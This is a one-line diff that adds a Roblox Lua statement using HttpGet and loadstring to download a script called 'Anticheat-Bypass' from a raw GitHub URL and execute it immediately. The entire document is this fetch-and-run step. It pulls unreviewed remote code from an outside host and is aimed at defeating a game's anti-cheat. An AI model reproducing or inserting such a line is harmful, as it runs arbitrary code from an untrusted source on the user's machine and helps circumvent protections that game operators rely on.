@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/HanzieUWU/poop/main/Anticheat-Bypass'),true))()
